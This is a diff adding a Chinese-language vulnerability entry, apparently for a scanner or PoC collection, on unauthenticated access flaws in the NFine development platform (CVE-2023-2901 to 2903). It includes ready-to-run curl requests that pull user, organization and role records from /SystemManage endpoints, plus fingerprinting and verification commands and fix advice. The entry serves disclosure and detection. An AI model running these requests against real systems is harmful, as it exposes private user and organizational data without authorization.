@@ -1,0 +1,80 @@
+---
+id: NFINE-GETGRIDJSON-UNAUTH
+title: NFine快速开发平台 GetGridJson 系列接口未授权访问漏洞（CVE-2023-2901/CVE-2023-2902/CVE-2023-2903）
+product: nfine
+vendor: NFine
+version_affected: "20230511（2023-05-11 版本，CVE 记录确认受影响）"
+severity: HIGH
+tags: [unauth, auth_bypass, 未授权访问, 信息泄露, 国产]
+fingerprint: ["NFine", "nfine", "/SystemManage/"]
+---
+
+## 漏洞描述
+
+NFine 快速开发平台 20230511（2023-05-11 版本）中，`/SystemManage/User/GetGridJson`、`/SystemManage/Organize/GetTreeGridJson`、`/SystemManage/Role/GetGridJson` 等后台管理接口未做访问控制（CWE-284），未认证攻击者可直接调用接口读取用户、组织架构、角色等敏感管理数据。该问题分别对应 CVE-2023-2901（VDB-229975）、CVE-2023-2902（VDB-229976）、CVE-2023-2903（VDB-229977），于 2023-05-25 公开，PoC 已公开（webray.com.cn 披露，GitHub Peanut886/Vulnerability）。
+
+**注意**：以上均为已编号的「未授权访问」漏洞（CWE-284），不是 SQL 注入。`GetGridJson` 只是平台通用的列表查询接口名，不能仅因产品使用该接口就判定存在未授权或 SQL 注入；本条目只覆盖 CVE 记录中可核验的访问控制问题。
+
+## 影响版本
+
+- NFine Rapid Development Platform 20230511（2023-05-11 版本）
+- CVE 记录中仅确认此版本受影响，厂商未回应披露
+
+## 前置条件
+
+- 无需认证，无需任何 Cookie/Token
+- 目标为暴露在外的 NFine 平台（/SystemManage/ 路径可访问）
+
+## 利用步骤
+
+1. 直接以 GET 请求访问未授权接口，不带任何认证信息
+2. 观察响应：若返回 JSON 数据（用户/组织/角色记录）而非登录跳转或 401/403，则漏洞存在
+
+## Payload
+
+### CVE-2023-2901：用户列表（User/GetGridJson）
+
+```bash
+curl -s "http://target/SystemManage/User/GetGridJson?_search=false&nd=1680855479750&rows=50&page=1&sidx=F_CreatorTime+desc&sord=asc"
+```
+
+### CVE-2023-2902：组织树（Organize/GetTreeGridJson）
+
+```bash
+curl -s "http://target/SystemManage/Organize/GetTreeGridJson?_search=false&nd=1681813520783&rows=10000&page=1&sidx=&sord=asc"
+```
+
+### CVE-2023-2903：角色列表（Role/GetGridJson）
+
+```bash
+curl -s "http://target/SystemManage/Role/GetGridJson?keyword=&page=1&rows=20"
+```
+
+## 验证方法
+
+```bash
+# 未携带任何认证信息请求，响应包含用户/组织/角色 JSON 数据即存在未授权访问
+curl -s "http://target/SystemManage/User/GetGridJson?_search=false&rows=10&page=1" | head -c 500
+```
+
+## 指纹确认
+
+```bash
+curl -s "http://target/" | grep -i "nfine"
+# 或探测管理路径是否存在
+curl -s -o /dev/null -w "%{http_code}" "http://target/SystemManage/User/GetGridJson"
+```
+
+## 修复建议
+
+1. 对 /SystemManage/* 全部接口增加统一认证与授权校验（登录态 + 权限判断）
+2. 升级到厂商后续修复版本
+3. 通过 WAF/网关限制管理路径仅内网可访问
+
+## 参考
+
+- NVD CVE-2023-2901: https://nvd.nist.gov/vuln/detail/CVE-2023-2901
+- NVD CVE-2023-2902: https://nvd.nist.gov/vuln/detail/CVE-2023-2902
+- NVD CVE-2023-2903: https://nvd.nist.gov/vuln/detail/CVE-2023-2903
+- VulDB VDB-229975/229976/229977
+- PoC: https://github.com/Peanut886/Vulnerability （webray.com.cn 披露）
